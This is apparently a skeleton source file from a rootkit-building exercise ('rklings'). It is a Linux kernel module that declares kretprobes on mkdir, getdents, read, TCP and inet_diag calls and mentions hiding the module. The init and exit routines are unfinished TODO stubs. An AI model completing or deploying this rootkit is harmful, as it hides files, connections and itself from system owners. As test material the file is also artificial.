// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/printk.h>

extern struct kretprobe rk_mkdir_probe;
extern struct kretprobe rk_mkdirat_probe;
extern struct kretprobe rk_getdents_probe;
extern struct kretprobe rk_read_probe;
extern struct kretprobe rk_tcp4_probe;
extern struct kretprobe rk_tcp6_probe;
extern struct kretprobe rk_inet_diag_probe;

static struct kretprobe *probes[] = {
	&rk_mkdir_probe,
	&rk_mkdirat_probe,
	&rk_getdents_probe,
	&rk_read_probe,
	&rk_tcp4_probe,
	&rk_tcp6_probe,
	&rk_inet_diag_probe,
};

static int nr_probes;

static int cmd_ping(const char *arg)
{
	pr_info("rklings: pong\n");
	return 0;
}

static int cmd_status(const char *arg)
{
	pr_info("rklings: alive\n");
	return 0;
}

/* Agent lifecycle controls need a successful kernel-side acknowledgement.
 * The agent owns presentation/listing and connection teardown. */
static int cmd_agent_control(const char *arg)
{
	return 0;
}

static const struct rk_cmd_entry init_cmds[] = {
	{ "ping",   cmd_ping },
	{ "status", cmd_status },
	{ "list",   cmd_agent_control },
	{ "quit",   cmd_agent_control },
};

static int __init rk_init(void)
{
	// TODO: initialize target ownership, register all command providers, request
	// inet_diag, then register every probe. On a probe failure, unwind only the
	// successfully registered prefix in reverse order and return the real error.
	return -EOPNOTSUPP;
}

static void __exit rk_exit(void)
{
	// TODO: restore module visibility, unregister the registered probes in
	// reverse order, and log the completed unload.
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings local control milestone");
